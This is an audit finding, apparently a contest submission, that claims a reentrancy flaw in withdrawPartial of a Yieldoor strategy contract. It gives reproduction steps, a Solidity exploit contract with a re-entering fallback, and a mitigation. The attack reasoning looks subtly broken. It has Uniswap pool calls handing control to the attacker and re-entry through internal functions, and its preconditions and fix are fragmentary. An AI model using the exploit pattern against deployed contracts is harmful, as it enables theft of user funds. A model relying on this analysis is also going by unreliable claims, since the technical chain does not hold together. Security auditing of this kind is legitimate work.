# Reentrancy in withdrawPartial(uint256,uint256)

### Summary
https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Strategy.sol#L134

The function `withdrawPartial` makes external calls to Uniswap V3 before updating its internal state variables (mainPosition.liquidity and secondaryPosition.liquidity). This allows an attacker to re-enter the function or related functions before the state is properly updated, leading to fund mismanagement or double withdrawals.



### Root Cause

in withdrawPartial function missing CEI pattern or reentrancy guards via nonReentrant

### Internal Pre-conditions

## Steps to Reproduce
1. Attacker deposits liquidity into the strategy.
2. Attacker triggers withdrawPartial(), which calls _removeFromPosition().
3. _removeFromPosition() calls IUniswapV3Pool(pool).burn() and collect(), making external calls.
4. Before the contract updates mainPosition.liquidity, the attacker re-enters using functions like _addLiquidityToMainPosition() or collectFees().
5. The attacker drains more funds than allowed before the state is properly updated.

### External Pre-conditions

1. double withdrawals

### PoC

```solidity
pragma solidity ^0.8.20;

import "./Strategy.sol";  // Import the vulnerable contract

contract ReentrancyExploit {
    Strategy public strategy;
    address public attacker;

    constructor(address _strategy) {
        strategy = Strategy(_strategy);
        attacker = msg.sender;
    }

    function attack(uint256 amount) external {
        strategy.deposit(amount);  // Step 1: Deposit funds
        strategy.withdrawPartial(amount, amount);  // Step 2: Trigger withdrawal
    }

    fallback() external payable {
        if (address(strategy).balance > 0) {
            strategy.withdrawPartial(1 ether, 1 ether);  // Step 3: Re-enter before state update
        }
    }
}
```

### Mitigation

Implement the Checks-Effects-Interactions pattern:
Update state variables before external calls to Uniswap V3.
Use reentrancy guards via nonReentrant modifier.
```solidity
function withdrawPartial(uint256 amount, uint256 minAmount) external nonReentrant {
    // Update liquidity state first
    mainPosition.liquidity -= uint128(amount);
    secondaryPosition.liquidity -= uint128(amount);
    
    // Then perform external calls
    (uint256 m0, uint256 m1) = _removeFromPosition(
        uint128(amount),
        mainPosition.tickLower,
        mainPosition.tickUpper
    );
}
```
